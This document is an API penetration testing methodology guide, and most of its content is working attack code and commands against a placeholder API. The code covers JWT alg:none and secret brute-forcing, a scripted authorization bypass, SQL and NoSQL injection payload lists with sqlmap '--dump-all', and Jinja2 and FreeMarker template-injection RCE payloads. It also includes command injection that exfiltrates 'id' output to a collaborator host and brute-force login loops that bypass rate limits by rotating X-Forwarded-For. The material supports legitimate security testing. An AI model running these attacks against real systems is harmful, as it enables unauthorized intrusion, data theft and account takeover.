# API Pentesting Methodology

> **A structured, phase-based approach to testing APIs that ensures complete coverage — from initial reconnaissance through exploitation and reporting.**

---

## 🧠 What Is It?

**Analogy:** Think of this methodology like robbing a bank in a heist movie. First you case the joint (recon), understand the security layout (documentation review), test the guards (authentication), check if you can access any vault with any key (authorization), probe the alarm system (business logic), try picking locks (injection), measure guard patrol timing (rate limiting), and finally combine everything you found into a master plan (chaining vulnerabilities).

Without a methodology, you'll miss vulnerabilities. With it, you have a repeatable, systematic process that ensures every attack surface is evaluated.

---

## 🏗️ How It Works

```
Recon → Documentation → Authentication → Authorization → Business Logic → Injection → Rate Limiting → Report
```

Each phase builds on the previous. Authorization testing requires knowing all endpoints (from Recon). Injection testing requires understanding parameters (from Documentation). Chaining requires findings from all phases.

---

## 📊 Diagram

```mermaid
flowchart TD
    START([🎯 Target API]) --> P1

    subgraph P1 [Phase 1: Reconnaissance]
        R1[Web Crawling & JS Analysis]
        R2[Traffic Capture - Burp/mitmproxy]
        R3[Mobile App Decompilation]
        R4[GitHub/GitLab Search]
        R5[Wayback Machine]
        R6[kiterunner / ffuf fuzzing]
        R1 & R2 & R3 & R4 & R5 --> R6
    end

    P1 --> P2

    subgraph P2 [Phase 2: Documentation Review]
        D1[Swagger / OpenAPI Spec]
        D2[Postman Collections]
        D3[WSDL for SOAP]
        D4[Build Complete Endpoint List]
        D1 & D2 & D3 --> D4
    end

    P2 --> P3

    subgraph P3 [Phase 3: Auth Testing]
        A1[JWT Attacks]
        A2[API Key Testing]
        A3[OAuth Flow Testing]
        A4[Session Token Analysis]
        A1 & A2 & A3 & A4
    end

    P3 --> P4

    subgraph P4 [Phase 4: Authorization Testing]
        Z1[BOLA - Horizontal]
        Z2[BFLA - Vertical]
        Z3[Unauthenticated Access]
        Z4[Old API Versions]
        Z1 & Z2 & Z3 & Z4
    end

    P4 --> P5

    subgraph P5 [Phase 5: Business Logic]
        B1[Edge Cases]
        B2[Race Conditions]
        B3[State Machine Bypass]
        B4[Workflow Bypass]
        B1 & B2 & B3 & B4
    end

    P5 --> P6

    subgraph P6 [Phase 6: Injection Testing]
        I1[SQLi]
        I2[NoSQLi]
        I3[Command Injection]
        I4[SSTI]
        I1 & I2 & I3 & I4
    end

    P6 --> P7

    subgraph P7 [Phase 7: Rate Limiting]
        RL1[Baseline measurement]
        RL2[Bypass techniques]
        RL3[Resource exhaustion]
        RL1 & RL2 & RL3
    end

    P7 --> REPORT([📋 Report & Chain Vulns])

    style START fill:#ff6b6b,color:#fff
    style REPORT fill:#51cf66,color:#fff
    style P1 fill:#1e3a5f,color:#fff
    style P2 fill:#1e3a5f,color:#fff
    style P3 fill:#1e3a5f,color:#fff
    style P4 fill:#1e3a5f,color:#fff
    style P5 fill:#1e3a5f,color:#fff
    style P6 fill:#1e3a5f,color:#fff
    style P7 fill:#1e3a5f,color:#fff
```



---

## ⚙️ Technical Details

## Phase 1: Reconnaissance — Finding All APIs

The goal: build a complete list of every API endpoint before testing any of them. Never test what you haven't mapped.

### 1.1 Web Crawling & JavaScript Analysis

```bash
# Spider the target with Burp Suite
# Proxy browser → Burp → browse all functionality → Dashboard → Site map
# Right-click domain → Spider this host

# Extract URLs from JS files using LinkFinder
git clone https://github.com/GerbenJavado/LinkFinder
cd LinkFinder && pip3 install -r requirements.txt

# Single JS file
python3 linkfinder.py -i https://target.com/static/app.js -o cli

# Recursively from domain
python3 linkfinder.py -i https://target.com -d -o cli | grep "/api/"

# Manual JS analysis
# 1. Find all JS files
curl -s https://target.com | grep -oP 'src="([^"]+\.js)"' | cut -d'"' -f2

# 2. Download and analyze each
wget -r --no-parent -A "*.js" https://target.com/static/ -P ./js_files/

# 3. Extract API patterns
grep -rh -oP '["'"'"'](/(api|v[0-9]+)/[a-zA-Z0-9_/-]+)['"'"'"]' ./js_files/ \
  | tr -d '"'"'" | sort -u

# 4. Look for sensitive data in JS
grep -rh -iE "(api_key|apikey|token|secret|password|credential|auth)" ./js_files/

# gau — get all known URLs
go install github.com/lc/gau/v2/cmd/gau@latest
gau target.com | grep "/api/" | sort -u

# waybackurls
go install github.com/tomnomnom/waybackurls@latest
waybackurls target.com | grep "/api/" | sort -u
```

### 1.2 Network Traffic Capture

```bash
# Burp Suite — intercept all traffic
# Settings → Proxy → Add listener → 127.0.0.1:8080
# Configure browser proxy → browse all application features
# Check: Site map → right-click → Show only in-scope items

# mitmproxy — transparent proxy with filtering
mitmproxy --mode transparent \
  --ssl-insecure \
  -p 8080 \
  --flow-detail 2

# mitmdump — log to file for later analysis
mitmdump -w api_capture.flow \
  --filter '~u api' \
  -p 8080

# Replay and analyze
mitmdump -r api_capture.flow | grep ">> GET\|>> POST\|>> PUT\|<< 200\|<< 401\|<< 403"

# tcpdump (non-TLS only, or if you have certs)
sudo tcpdump -i eth0 -A 'host api.target.com and port 80' | grep -oP 'GET|POST|PUT|DELETE.*HTTP'
```

### 1.3 Mobile App Analysis

```bash
# ─── Android ────────────────────────────────────────────────────
# Step 1: Get APK
adb shell pm list packages | grep "target"
adb shell pm path com.target.app
adb pull /data/app/com.target.app-1/base.apk target.apk

# Or download from: APKPure, APKMirror

# Step 2: Decompile with APKTool (resources + smali)
apktool d target.apk -o target_decoded/

# Step 3: Decompile to Java with jadx
jadx -d target_jadx/ target.apk

# Step 4: Extract API endpoints
grep -r "https\?://api\." target_jadx/ --include="*.java" \
  | grep -oP '"https?://[^"]*api[^"]*"' | sort -u

grep -r "okhttp\|retrofit\|volley\|API_URL\|BASE_URL\|ENDPOINT" \
  target_jadx/ --include="*.java" | head -50

# Step 5: Look for hardcoded secrets
grep -r "api_key\|apikey\|api-key\|secret\|token\|bearer\|password" \
  target_jadx/ --include="*.java" | grep -v "//.*" | head -30

grep -r "api_key\|secret\|token" target_decoded/res/ | head -20

# Step 6: Check AndroidManifest.xml for API URLs
grep -i "api\|url\|endpoint\|host" target_decoded/AndroidManifest.xml

# ─── iOS ─────────────────────────────────────────────────────────
# Unpack IPA
unzip target.ipa -d ipa_extracted/

# Extract strings (API URLs, keys)
strings ipa_extracted/Payload/App.app/App | grep "https://api\."
strings ipa_extracted/Payload/App.app/App | grep -iE "api[_-]?key|bearer|token|secret"

# Binary analysis
otool -l ipa_extracted/Payload/App.app/App | grep -A4 "name.*api"

# ─── Frida — Runtime API Interception ───────────────────────────
# Useful when APIs are obfuscated at build time

# Hook all HTTP requests
cat > api_hook.js << 'EOF'
Java.perform(function() {
    var OkHttpClient = Java.use('okhttp3.OkHttpClient');
    var Request = Java.use('okhttp3.Request');
    
    OkHttpClient.newCall.overload('okhttp3.Request').implementation = function(request) {
        console.log('[API CALL] ' + request.method() + ' ' + request.url().toString());
        var headers = request.headers();
        for (var i = 0; i < headers.size(); i++) {
            console.log('  Header: ' + headers.name(i) + ': ' + headers.value(i));
        }
        return this.newCall(request);
    };
});
EOF

frida -U -l api_hook.js com.target.app

# ─── Burp on Android ────────────────────────────────────────────
# Install Burp CA cert on device
adb push cacert.der /sdcard/
# Settings → Security → Install certificate

# For apps with certificate pinning — bypass with Frida
frida -U -l ssl_pinning_bypass.js com.target.app
# Script: https://github.com/frida/frida-scripts/
```

### 1.4 GitHub/GitLab Reconnaissance

```bash
# Search GitHub for target's API documentation
# Google dork:
# site:github.com "api.target.com"
# site:github.com "target.com" swagger OR openapi OR postman

# GitHub API search
curl "https://api.github.com/search/code?q=api.target.com+swagger" \
  -H "Authorization: token YOUR_GITHUB_TOKEN" | jq '.items[].html_url'

# Look for leaked Postman collections
curl "https://api.github.com/search/code?q=api.target.com+filename:*.postman_collection.json" \
  -H "Authorization: token YOUR_GITHUB_TOKEN"

# GitLab public search
# https://gitlab.com/search?search=api.target.com

# Search for exposed credentials
# site:github.com "api.target.com" "api_key" OR "token" OR "secret"

# Exposed .env files
curl "https://api.github.com/search/code?q=api.target.com+filename:.env" \
  -H "Authorization: token YOUR_GITHUB_TOKEN"

# truffleHog — secret scanning
trufflehog github --repo https://github.com/target-company/target-api

# gitleaks
gitleaks detect --source . --report-path leaks.json
```

### 1.5 Wayback Machine

```bash
# Get all archived API URLs
curl "https://web.archive.org/cdx/search/cdx?\
url=api.target.com/*\
&output=text\
&fl=original\
&collapse=urlkey\
&limit=5000" | grep "/api/" | sort -u > wayback_api_urls.txt

# Get archived Swagger/OpenAPI specs
curl "https://web.archive.org/cdx/search/cdx?\
url=api.target.com/*swagger*\
&output=text\
&fl=original" | head -20

# Download a specific archived version of swagger.json
curl "https://web.archive.org/web/20200101000000*/https://api.target.com/swagger.json"
```

---

## Phase 2: Documentation Review

### 2.1 Swagger/OpenAPI Analysis

```bash
# Download spec
curl https://api.target.com/api-docs/openapi.json -o spec.json
curl https://api.target.com/swagger.json -o spec.json

# Parse with Python
python3 << 'EOF'
import json

spec = json.load(open('spec.json'))

print("=== ALL ENDPOINTS ===")
for path, methods in spec.get('paths', {}).items():
    for method, details in methods.items():
        if method in ['get','post','put','patch','delete']:
            auth = "🔒" if details.get('security') else "🔓 NO AUTH!"
            print(f"{auth} {method.upper()} {path}")

print("\n=== ENDPOINTS WITHOUT AUTH ===")
for path, methods in spec.get('paths', {}).items():
    for method, details in methods.items():
        if method in ['get','post','put','patch','delete']:
            if not details.get('security'):
                print(f"  {method.upper()} {path}")

print("\n=== ALL PARAMETERS ===")
for path, methods in spec.get('paths', {}).items():
    for method, details in methods.items():
        for param in details.get('parameters', []):
            print(f"  {method.upper()} {path}: {param.get('name')} ({param.get('in')}) required={param.get('required', False)}")
EOF

# Use swagger-cli to validate and explore
npm install -g swagger-cli
swagger-cli validate spec.json
swagger-cli bundle spec.json

# Import to Postman for testing
# Postman → Import → Link → paste URL to spec
# Generates full collection automatically
```

### 2.2 Building Endpoint Matrix

```bash
# Create test matrix spreadsheet
python3 << 'EOF'
import json, csv

spec = json.load(open('spec.json'))
base_url = spec.get('servers', [{}])[0].get('url', '')

with open('endpoint_matrix.csv', 'w', newline='') as f:
    writer = csv.writer(f)
    writer.writerow(['Method', 'Endpoint', 'Auth Required', 'Parameters', 'Test Status', 'Findings'])
    
    for path, methods in spec.get('paths', {}).items():
        for method, details in methods.items():
            if method in ['get','post','put','patch','delete','head','options']:
                params = [p['name'] for p in details.get('parameters', [])]
                auth = "Yes" if details.get('security') else "NO AUTH"
                writer.writerow([method.upper(), base_url + path, auth, ','.join(params), 'Pending', ''])

print("Created endpoint_matrix.csv")
EOF
```

---

## Phase 3: Authentication Testing

### 3.1 JWT Complete Testing

```bash
# Step 1: Collect all JWTs from traffic
# Burp → Search → Authorization: Bearer

# Step 2: Decode (no verification needed)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0In0.xxx" \
  | cut -d'.' -f2 \
  | base64 -d 2>/dev/null \
  | python3 -m json.tool

# Or use jwt_tool
python3 jwt_tool.py <JWT>

# Step 3: Check expiry
python3 -c "
import base64, json
payload = '<JWT_PAYLOAD_PART>'
padded = payload + '=' * (4 - len(payload) % 4)
data = json.loads(base64.urlsafe_b64decode(padded))
import datetime
exp = data.get('exp', 0)
print(f'Expires: {datetime.datetime.utcfromtimestamp(exp)} UTC')
"

# Step 4: Test all algorithm attacks
python3 jwt_tool.py <JWT> -X a    # alg:none
python3 jwt_tool.py <JWT> -X n    # null signature
python3 jwt_tool.py <JWT> -X b    # blank password
python3 jwt_tool.py <JWT> -X s    # sign with RS public key as HS secret
python3 jwt_tool.py <JWT> -X k -pk public_key.pem  # key confusion

# Step 5: Brute force secret
python3 jwt_tool.py <JWT> -C -d /usr/share/wordlists/rockyou.txt

hashcat -a 0 -m 16500 <JWT> /usr/share/wordlists/rockyou.txt --show

# Step 6: Tamper payload (after finding weak secret)
python3 jwt_tool.py <JWT> -T    # Interactive tamper mode
# Or specify fields:
python3 jwt_tool.py <JWT> -I -pc role -pv admin  # Change role to admin

# Step 7: Test JWT in different locations
# Standard: Authorization: Bearer <JWT>
# Cookie: session=<JWT>
# Query param: ?token=<JWT>
# Body: {"token": "<JWT>"}
```

### 3.2 API Key Testing

```bash
# 1. Find API key exposure
# Check: URL params, response bodies, error messages, JS files, source HTML comments

# 2. Test key entropy (weak keys are brute-forceable)
# Extract key: sk-1234567890abcdef
# Character set? Length? Pattern?

# 3. Test key in different headers
for HEADER in "X-API-Key" "api-key" "API-Key" "Authorization" "x-auth-token" "token"; do
  echo -n "$HEADER: "
  curl -s -o /dev/null -w "%{http_code}\n" \
    -H "$HEADER: YOUR_API_KEY" \
    https://api.target.com/api/v1/users
done

# 4. Test key in different locations
# Header (most secure):
curl -H "X-API-Key: sk-abc123" https://api.target.com/api/v1/users
# Query param (check if logs it):
curl "https://api.target.com/api/v1/users?api_key=sk-abc123"
# Body:
curl -X POST https://api.target.com/api/v1/data \
  -d '{"api_key": "sk-abc123", "query": "test"}'

# 5. Test key rotation and revocation
# Get key → make request (works) → rotate key → try old key (should fail)

# 6. Test scope of keys
# Does a read-only key allow write operations?
curl -X POST https://api.target.com/api/v1/users \
  -H "X-API-Key: READONLY_KEY" \
  -H "Content-Type: application/json" \
  -d '{"username": "test"}'
```

### 3.3 OAuth 2.0 Testing

```bash
# Step 1: Identify OAuth flow
# Check: login redirect URL contains oauth/authorize
# Look for: client_id, redirect_uri, scope, state, code_challenge

# Step 2: Test open redirect in redirect_uri
# Original: &redirect_uri=https://app.target.com/callback
# Attack:   &redirect_uri=https://evil.com
#           &redirect_uri=https://app.target.com.evil.com
#           &redirect_uri=https://app.target.com/callback/../../../evil
curl "https://api.target.com/oauth/authorize?\
client_id=CLIENT_ID\
&redirect_uri=https://evil.com\
&response_type=code\
&scope=read"

# Step 3: CSRF — missing state parameter
# If state is not validated, CSRF attack allows auth code theft
# Original flow validates state; test with:
# - Empty state
# - Same state for multiple sessions
# - No state at all

# Step 4: PKCE downgrade (if code_challenge not enforced)
# Public client without PKCE can have auth code stolen
# Try omitting code_challenge and code_challenge_method

# Step 5: Token leakage via Referer
# If auth code/token appears in URL → may leak via Referer header
# Check if app uses implicit flow (tokens in URL fragment)

# Step 6: Token scope escalation
# Request minimal scope, see if broader permissions work
curl -X POST https://api.target.com/oauth/token \
  -d "grant_type=client_credentials&client_id=X&client_secret=Y&scope=admin"

# Step 7: Expired token reuse
ACCESS_TOKEN=$(curl -s -X POST .../token ... | jq -r .access_token)
# Wait for expiry or call /revoke
curl -X POST https://api.target.com/oauth/revoke -d "token=$ACCESS_TOKEN"
# Try using revoked token — should get 401
curl -H "Authorization: Bearer $ACCESS_TOKEN" https://api.target.com/api/v1/users/me
```

---

## Phase 4: Authorization Testing

### Complete BOLA/BFLA Test Matrix

```bash
#!/bin/bash
# api_authz_test.sh — Test authorization for every endpoint

BASE_URL="https://api.target.com"
TOKEN_A="<USER_A_JWT>"      # Regular user
TOKEN_B="<USER_B_JWT>"      # Another regular user  
TOKEN_ADMIN="<ADMIN_JWT>"   # Admin (if you have one)
NO_TOKEN=""

# Object IDs belonging to User A
USER_A_ID="1234"
USER_A_ORDER="ORD-9001"
USER_A_DOC="DOC-555"

echo "=== BOLA TESTING: Access User A's Objects with User B's Token ==="
ENDPOINTS=(
  "GET /api/v1/users/$USER_A_ID"
  "GET /api/v1/orders/$USER_A_ORDER"
  "GET /api/v1/documents/$USER_A_DOC"
  "PATCH /api/v1/users/$USER_A_ID"
  "DELETE /api/v1/users/$USER_A_ID"
)

for ENDPOINT in "${ENDPOINTS[@]}"; do
  METHOD=$(echo $ENDPOINT | cut -d' ' -f1)
  PATH=$(echo $ENDPOINT | cut -d' ' -f2)
  
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$METHOD" \
    -H "Authorization: Bearer $TOKEN_B" \
    "$BASE_URL$PATH")
  
  if [[ "$STATUS" =~ ^(200|201|204)$ ]]; then
    echo "❌ BOLA FOUND: $METHOD $PATH → $STATUS (User B can access User A's data!)"
  else
    echo "✅ OK: $METHOD $PATH → $STATUS"
  fi
done

echo ""
echo "=== BFLA TESTING: Regular User Accessing Admin Functions ==="
ADMIN_ENDPOINTS=(
  "GET /api/v1/admin/users"
  "GET /api/v1/admin/logs"
  "POST /api/v1/admin/users/$USER_A_ID/ban"
  "GET /api/v1/users"
  "DELETE /api/v1/users/$USER_A_ID"
  "GET /api/v1/internal/config"
  "GET /api/v1/stats/all"
)

for ENDPOINT in "${ADMIN_ENDPOINTS[@]}"; do
  METHOD=$(echo $ENDPOINT | cut -d' ' -f1)
  PATH=$(echo $ENDPOINT | cut -d' ' -f2)
  
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$METHOD" \
    -H "Authorization: Bearer $TOKEN_A" \
    "$BASE_URL$PATH")
  
  if [[ "$STATUS" =~ ^(200|201|204)$ ]]; then
    echo "❌ BFLA FOUND: $METHOD $PATH → $STATUS (Regular user can access admin function!)"
  else
    echo "✅ OK: $METHOD $PATH → $STATUS"
  fi
done

echo ""
echo "=== UNAUTHENTICATED ACCESS ==="
for ENDPOINT in "${ENDPOINTS[@]}"; do
  METHOD=$(echo $ENDPOINT | cut -d' ' -f1)
  PATH=$(echo $ENDPOINT | cut -d' ' -f2)
  
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -X "$METHOD" \
    "$BASE_URL$PATH")
  
  if [[ "$STATUS" =~ ^(200|201|204)$ ]]; then
    echo "❌ NO AUTH REQUIRED: $METHOD $PATH → $STATUS"
  fi
done
```

### Old API Version Testing

```bash
# Old versions often lack the same auth/authz as current
for VERSION in v1 v2 v3 v4 v5 beta alpha legacy old; do
  echo "=== Testing /api/$VERSION/ ==="
  
  # Test without auth
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://api.target.com/api/$VERSION/users")
  echo "  /api/$VERSION/users (no auth): $STATUS"
  
  # Test with current token
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $TOKEN_A" \
    "https://api.target.com/api/$VERSION/users")
  echo "  /api/$VERSION/users (with auth): $STATUS"
done
```

---

## Phase 5: Business Logic Testing

### 5.1 Edge Case Testing

```bash
# Negative values
curl -X POST https://api.target.com/api/v1/cart/add \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"productId": "PROD-001", "quantity": -100}'

# Zero value
curl -X POST https://api.target.com/api/v1/orders \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"items": [{"id": "PROD-001", "price": 0.00}]}'

# Extremely large values
curl -X POST https://api.target.com/api/v1/transfer \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount": 99999999999999.99, "to": "victim@target.com"}'

# Float precision abuse
curl -X POST https://api.target.com/api/v1/transfer \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"amount": 0.000000001}'

# String instead of number
curl -X POST https://api.target.com/api/v1/cart/add \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"productId": "PROD-001", "quantity": "abc"}'

# Array instead of string
curl -X POST https://api.target.com/api/v1/cart/add \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"productId": ["PROD-001", "PROD-002"], "quantity": 1}'
```

### 5.2 Race Conditions

```bash
# Turbo Intruder (Burp) — send concurrent requests
# Right-click request → Send to Turbo Intruder
# Select "Race single-packet attack" template

# Manual race condition with curl + bash background jobs
# Test: can you buy more than available stock?
for i in $(seq 1 20); do
  curl -s -X POST https://api.target.com/api/v1/orders \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"itemId": "LIMITED-001", "qty": 1}' \
    -o "response_$i.json" &
done
wait
# Check responses for success
grep -l '"success":true' response_*.json | wc -l

# Race condition in balance transfer
# User has $100 — can we transfer $100 simultaneously to two accounts?
for DEST in "account-A" "account-B"; do
  curl -s -X POST https://api.target.com/api/v1/transfer \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{\"amount\": 100, \"to\": \"$DEST\"}" \
    -o "transfer_${DEST}.json" &
done
wait
cat transfer_*.json
```

### 5.3 Workflow Bypass

```bash
# Typical flow: Step 1 → Step 2 → Step 3 → Complete
# Test: can you skip to Step 3 directly?

# Example: Checkout flow
# Normal: cart → address → payment → confirm → order
# Skip to confirm:
curl -X POST https://api.target.com/api/v1/orders/confirm \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"cartId": "CART-123"}'
# Bypasses payment step?

# Email verification bypass
# Normal flow: register → verify email → access full features
# Can you access full features before verifying?
curl -H "Authorization: Bearer $UNVERIFIED_TOKEN" \
  https://api.target.com/api/v1/premium/features

# Password change without current password verification
curl -X PUT https://api.target.com/api/v1/users/me/password \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"newPassword": "attacker123"}'
# Missing currentPassword field — does it work?
```

---

## Phase 6: Injection Testing

### 6.1 SQLi in REST Parameters

```bash
# Error-based SQLi (look for DB errors in response)
PAYLOADS=(
  "'"
  "'--"
  "' OR '1'='1"
  "' OR '1'='1'--"
  "' OR 1=1--"
  "' UNION SELECT NULL--"
  "1; SELECT SLEEP(5)--"
  "1' AND SLEEP(5)--"
  "\" OR \"1\"=\"1"
  "\") OR (\"1\"=\"1"
)

for PAYLOAD in "${PAYLOADS[@]}"; do
  echo -n "Testing: $PAYLOAD → "
  TIME_BEFORE=$(date +%s%N)
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
    "https://api.target.com/api/v1/users?name=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))")")
  TIME_AFTER=$(date +%s%N)
  DURATION=$(( ($TIME_AFTER - $TIME_BEFORE) / 1000000 ))
  echo "HTTP $STATUS (${DURATION}ms)"
done

# Time-based blind SQLi confirmation
curl -w "\nTime: %{time_total}s\n" \
  "https://api.target.com/api/v1/users?id=1%27%20AND%20SLEEP(5)--%20"

# SQLMap automation
sqlmap -u "https://api.target.com/api/v1/users?id=1" \
  --headers="Authorization: Bearer $TOKEN" \
  --level=3 --risk=2 \
  --dbms=mysql \
  --batch \
  --dump-all

# SQLMap on POST JSON body
sqlmap -u "https://api.target.com/api/v1/users/login" \
  --method=POST \
  --data='{"username": "*", "password": "test"}' \
  --headers="Content-Type: application/json" \
  --level=3 --batch
```

### 6.2 NoSQLi (MongoDB)

```bash
# MongoDB operator injection
# $gt (greater than), $ne (not equal), $regex

# Bypass login
curl -X POST https://api.target.com/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$gt": ""}}'

curl -X POST https://api.target.com/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": null}, "password": {"$ne": null}}'

# Regex extraction (blind)
# Test each character of password
for CHAR in a b c d e f g h i j k l m n o p q r s t u v w x y z 0 1 2 3 4 5 6 7 8 9; do
  RESULT=$(curl -s -X POST https://api.target.com/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d "{\"username\": \"admin\", \"password\": {\"\$regex\": \"^$CHAR\"}}" \
    | jq -r .success)
  if [ "$RESULT" = "true" ]; then
    echo "Password starts with: $CHAR"
  fi
done

# URL-encoded NoSQLi for GET params
curl "https://api.target.com/api/v1/users?username[$ne]=&password[$ne]="
```

### 6.3 SSTI (Server-Side Template Injection)

```bash
# Polyglot SSTI probe
PROBES=(
  "{{7*7}}"
  "\${7*7}"
  "<%= 7*7 %>"
  "#{7*7}"
  "*{7*7}"
  "{{7*'7'}}"
  "{{config}}"
  "\${{7*7}}"
)

for PROBE in "${PROBES[@]}"; do
  ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PROBE'))")
  RESPONSE=$(curl -s "https://api.target.com/api/v1/render?template=$ENCODED")
  if echo "$RESPONSE" | grep -qE "^49$|\"49\"|>49<"; then
    echo "SSTI FOUND with probe: $PROBE"
    echo "Response: $RESPONSE"
  fi
done

# Jinja2 (Python) RCE
PAYLOAD='{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
curl -X POST https://api.target.com/api/v1/email/send \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"subject\": \"$PAYLOAD\", \"body\": \"test\"}"

# FreeMarker (Java) RCE
curl -X POST https://api.target.com/api/v1/render \
  -H "Content-Type: application/json" \
  -d '{"template": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}"}'
```

### 6.4 Command Injection

```bash
# Common entry points: filename, host, cmd, exec, shell, ping, query

# Classic command injection
PAYLOADS=(
  "; id"
  "| id"
  "& id"
  "&& id"
  "\`id\`"
  "\$(id)"
  "; sleep 5"
  "| sleep 5"
)

for PAYLOAD in "${PAYLOADS[@]}"; do
  echo -n "Testing: $PAYLOAD → "
  TIME=$(curl -w "%{time_total}" -s -o /dev/null \
    "https://api.target.com/api/v1/network/ping?host=127.0.0.1$PAYLOAD")
  echo "${TIME}s"
done

# Blind command injection — out-of-band
curl -X POST https://api.target.com/api/v1/network/ping \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"host": "127.0.0.1; curl https://YOUR_COLLABORATOR.com/`id`"}'
```

---

## Phase 7: Rate Limiting Testing

### Complete Rate Limit Testing

```bash
# Baseline measurement
echo "=== Finding Rate Limit Threshold ==="
for i in $(seq 1 100); do
  RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
    -X POST https://api.target.com/api/v1/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username": "admin", "password": "wrong"}')
  echo "Attempt $i: HTTP $RESULT"
  [ "$RESULT" = "429" ] && echo "Rate limited at attempt $i" && break
done

# Bypass techniques
echo "=== Testing Bypass Headers ==="
BYPASS_HEADERS=(
  "X-Forwarded-For: 1.2.3.4"
  "X-Real-IP: 1.2.3.4"
  "X-Originating-IP: 1.2.3.4"
  "X-Remote-IP: 1.2.3.4"
  "X-Remote-Addr: 1.2.3.4"
  "X-Client-IP: 1.2.3.4"
  "True-Client-IP: 1.2.3.4"
  "CF-Connecting-IP: 1.2.3.4"
)

# Send 20 requests with each bypass header
for HEADER in "${BYPASS_HEADERS[@]}"; do
  echo -n "Header '$HEADER' — 20 requests: "
  SUCCESS=0
  for i in $(seq 1 20); do
    RESULT=$(curl -s -o /dev/null -w "%{http_code}" \
      -H "$HEADER" \
      -X POST https://api.target.com/api/v1/auth/login \
      -H "Content-Type: application/json" \
      -d '{"username": "admin", "password": "wrong"}')
    [ "$RESULT" != "429" ] && ((SUCCESS++))
  done
  echo "$SUCCESS/20 not rate limited"
done

# Rotate IP in X-Forwarded-For
for i in $(seq 1 1000); do
  IP="$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
  curl -s -o /dev/null \
    -X POST https://api.target.com/api/v1/auth/login \
    -H "X-Forwarded-For: $IP" \
    -H "Content-Type: application/json" \
    -d '{"username": "admin", "password": "test"}' &
done
wait
```

---

## 🛠️ Tools Setup & Configuration

### Burp Suite API Testing Workflow

```
Essential Extensions (Install via BApp Store):
├── InQL              → GraphQL introspection + query building
├── Autorize          → Automated BOLA/BFLA testing
├── Param Miner       → Discover hidden parameters
├── JWT Editor        → JWT attacks (alg:none, RS256→HS256, brute)
├── Turbo Intruder    → Race conditions + high-speed fuzzing
├── Logger++          → Log all traffic with filtering
├── JSON Beautifier   → Readable JSON in requests
├── Hackvertor        → Encoding/decoding transformations
└── Active Scan++     → Enhanced active scanning for APIs

Workflow:
1. Proxy → Options → Add scope for target domain
2. Browse entire application (authenticated)
3. Burp → Target → Site Map → filter by scope
4. Export all API requests: right-click → Save items
5. Send all API endpoints to Intruder/Repeater/Scanner
6. Enable Autorize: add attacker token → browse as victim
7. Review Autorize log for red (same response) items
```

### Postman API Testing Setup

```javascript
// Environment variables
{
  "baseUrl": "https://api.target.com",
  "userToken": "eyJhbGc...",
  "adminToken": "eyJhbGc...",
  "userId": "1234",
  "victimUserId": "1235"
}

// Pre-request script — auto-refresh token
pm.sendRequest({
  url: pm.environment.get("baseUrl") + "/api/v1/auth/refresh",
  method: "POST",
  header: {"Content-Type": "application/json"},
  body: {
    mode: "raw",
    raw: JSON.stringify({refresh_token: pm.environment.get("refreshToken")})
  }
}, (err, res) => {
  if (!err && res.code === 200) {
    pm.environment.set("userToken", res.json().access_token);
  }
});

// Test script — check for BOLA
pm.test("Should be 403 (not my data)", () => {
  pm.response.to.have.status(403);
});

pm.test("Response should not contain victim email", () => {
  const body = pm.response.json();
  pm.expect(JSON.stringify(body)).to.not.include("victim@target.com");
});
```

### jwt_tool Complete Guide

```bash
# Install
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool && pip3 install -r requirements.txt

# Decode
python3 jwt_tool.py <JWT>

# Tamper mode (interactive)
python3 jwt_tool.py <JWT> -T

# Tamper specific field
python3 jwt_tool.py <JWT> -I -pc role -pv admin

# All exploit modes
python3 jwt_tool.py <JWT> -X a      # alg:none
python3 jwt_tool.py <JWT> -X n      # null signature
python3 jwt_tool.py <JWT> -X b      # blank secret
python3 jwt_tool.py <JWT> -X e      # embeds JWK in header
python3 jwt_tool.py <JWT> -X s      # spoof RS256 with HS256

# Brute force
python3 jwt_tool.py <JWT> -C -d rockyou.txt

# Scan mode (tests all attacks automatically)
python3 jwt_tool.py <JWT> -M pb    # playbook scan
python3 jwt_tool.py <JWT> -M at    # all tests
```

---

## 📋 API Pentest Checklist

### Phase 1: Recon
- [ ] Swagger/OpenAPI spec found and downloaded
- [ ] All JS files analyzed for API endpoints
- [ ] Mobile app decompiled (if applicable)
- [ ] GitHub searched for leaked docs/keys
- [ ] Wayback Machine checked for old endpoints
- [ ] kiterunner scan completed
